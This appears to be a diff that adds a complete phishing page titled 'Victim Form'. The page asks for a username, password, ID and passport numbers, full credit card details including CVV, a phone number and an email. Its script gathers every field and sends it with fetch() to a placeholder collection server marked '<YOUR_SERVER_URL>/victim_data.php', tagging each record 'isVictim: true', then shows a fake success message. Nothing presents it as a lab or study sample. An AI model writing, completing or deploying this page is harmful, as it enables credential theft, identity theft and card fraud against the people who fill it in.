@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Victim Form</title>
+  <style>
+    body { font-family: Arial, sans-serif; margin: 0; padding: 0; }
+    .container { max-width: 600px; margin: auto; }
+    input, textarea, button { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #ddd; border-radius: 4px; }
+    button { background-color: #4CAF50; color: white; border: none; cursor: pointer; }
+    .center { text-align: center; }
+    .form-row { display: flex; justify-content: space-between; align-items: center; }
+    .field-name { font-weight: bold; width: 150px; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2 class="center">Victim Form</h2>
+    <form id="victimForm">
+      <div class="form-row">
+        <label class="field-name" for="username">Username:</label>
+        <input type="text" id="username" name="username" required>
+      </div>
+      <div class="form-row">
+        <label class="field-name" for="password">Password:</label>
+        <input type="password" id="password" name="password" required>
+      </div>
+      <div class="form-row">
+        <label class="field-name" for="id">ID/Passport Number:</label>
+        <input type="text" id="id" name="id" required>
+      </div>
+      <div class="form-row">
+        <label class="field-name" for="passport">Passport Number:</label>
+        <input type="text" id="passport" name="passport" required>
+      </div>
+      <div class="form-row">
+        <label class="field-name" for="card_number">Credit Card Number:</label>
+        <input type="text" id="card_number" name="card_number" required>
+      </div>
+      <div class="form-row">
+        <label class="field-name" for="card_exp_month">Card Expiration Month:</label>
+        <input type="text" id="card_exp_month" name="card_exp_month" required>
+      </div>
+      <div class="form-row">
+        <label class="field-name" for="card_exp_year">Card Expiration Year:</label>
+        <input type="number" id="card_exp_year" name="card_exp_year" required>
+      </div>
+      <div class="form-row">
+        <label class="field-name" for="card_cvv">CVV:</label>
+        <input type="text" id="card_cvv" name="card_cvv" required>
+      </div>
+      <div class="form-row">
+        <label class="field-name" for="phone">Phone Number:</label>
+        <input type="tel" id="phone" name="phone" required>
+      </div>
+      <div class="form-row">
+        <label class="field-name" for="email">Email Address:</label>
+        <input type="email" id="email" name="email" required>
+      </div>
+      <button type="submit">Submit</button>
+    </form>
+  </div>
+
+  <script>
+    document.getElementById('victimForm').addEventListener('submit', async (event) => {
+      event.preventDefault();
+      const serverUrl = 'https://<YOUR_SERVER_URL>/victim_data.php';
+      await sendDataToServer(serverUrl);
+    });
+
+    async function sendDataToServer(serverUrl) {
+      const data = {
+        isVictim: true,
+        ...collectFormData()
+      };
+
+      try {
+        const response = await fetch(serverUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(data)
+        });
+
+        if (!response.ok) {
+          throw new Error(`HTTP error! status: ${response.status}`);
+        }
+
+        const result = await response.json();
+        if (result.success) {
+          alert('Form submitted successfully!');
+        } else {
+          alert('Error submitting form. Please try again later.');
+        }
+      } catch (error) {
+        console.error('Error sending data to server:', error);
+        alert('Error submitting form. Please try again later.');
+      }
+    }
+
+    function collectFormData() {
+      return {
+        username: document.getElementById('username').value,
+        password: document.getElementById('password').value,
+        id: document.getElementById('id').value,
+        passport: document.getElementById('passport').value,
+        card_number: document.getElementById('card_number').value,
+        card_exp_month: document.getElementById('card_exp_month').value,
+        card_exp_year: document.getElementById('card_exp_year').value,
+        card_cvv: document.getElementById('card_cvv').value,
+        phone: document.getElementById('phone').value,
+        email: document.getElementById('email').value,
+      };
+    }
+  </script>
+</body>
+</html>
